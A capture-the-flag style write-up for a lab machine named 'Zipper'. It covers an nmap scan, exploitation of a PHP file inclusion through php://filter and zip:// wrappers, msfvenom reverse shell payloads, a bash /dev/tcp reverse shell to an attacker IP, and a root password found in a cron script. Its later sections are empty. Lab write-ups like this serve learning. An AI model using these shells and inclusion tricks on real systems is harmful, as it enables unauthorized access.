#Pwned
```IP
192.168.213.229
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.213.229 -vvv -p- -oN enum/full
```
The output being:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH6PH1/ST7TUJ4Mp/l4c7G+TM07YbX7YIsnHzq1TRpvtiBh8MQuFkL1SWW9+za+h6ZraqoZ0ewwkH+0la436t9Q+2H/Nh4CntJOrRbpLJKg4hChjgCHd5KiLCOKHhXPs/FA3mm0Zkzw1tVJLPR6RTbIkkbQiV2Zk3u8oamV5srWIJeYUY5O2XXmTnKENfrPXeHup1+3wBOkTO4Mu17wBSw6yvXyj+lleKjQ6Hnje7KozW5q4U6ijd3LmvHE34UHq/qUbCUbiwY06N2Mj0NQiZqWW8z48eTzGsuh6u1SfGIDnCCq3sWm37Y5LIUvqAFyIEJZVsC/UyrJDPBE+YIODNbN2QLD9JeBr8P4n1rkMaXbsHGywFtutdSrBZwYuRuB2W0GjIEWD/J7lxKIJ9UxRq0UxWWkZ8s3SNqUq2enfPwQt399nigtUerccskdyUD0oRKqVnhZCjEYfX3qOnlAqejr3Lpm8nA31pp6lrKNAmQEjdSO8Jxk04OR2JBxcfVNfs=
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0EdIHR7NOReMM0G7C8zxbLgwB3ump+nb2D3Pe3tXqp/6jNJ/GbU2e4Ab44njMKHJbm/PzrtYzojMjGDuBlQCg=
|   256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDCc0saExmeDXtqm5FS+D5RnDke8aJEvFq3DJIr0KZML
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Zipper
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## HTTP
Here we can find what seems like a file upload vulnerability.
# Exploitation

```
ffuf -u 'http://192.168.213.229/index.php?file=php://filter/convert.base64-encode/resource=FUZZ' -w /usr/share/seclists/Discovery/Web-Con
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203160149.png?raw=true)
seems like it is adding .php to its resources, so we can access it just by typing 'upload' for example
```
http://192.168.213.229/index.php?file=php://filter/convert.base64-encode/resource=upload
```
we can review the code by decoding it
```
cat upload64| base64 -d
```
we create our shell as follows:
```
msfvenom -p php/reverse_php LHOST=192.168.45.176 LPORT=9001 -o shell.php
```
we upload it and intercept it to see the zip name

Executing the shell with a zip filter as shown in https://book.hacktricks.xyz/pentesting-web/file-inclusion#zip-and-rar

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203163728.png?raw=true)

```
/index.php?file=zip:///var/www/html/uploads/upload_1733238807.zip%23shell
```
```
/bin/bash -i >& /dev/tcp/ 192.168.45.176/4444 0>&1
```

since I was struggling to upgrade this php reverse shell, I just imported a new one created with msfvenom
```
sfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=4444 -f elf > shell.elf
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203164727.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203164751.png?raw=true)


# PrivEsc

## Manual

we find something interesting in /opt
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203165123.png?raw=true)
seems like it is getting a password from /root
then removes all .tmp files from /var/www/html/uploads
then adds the files from backup.zip to some logs???
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203165253.png?raw=true)

maybe running pspy we can get this command in real time
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203165948.png?raw=true)
```
WildCardsGoingWild
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241203170122.png?raw=true)
## Automated

### Peass
### Mimikatz

# Lateral Movement

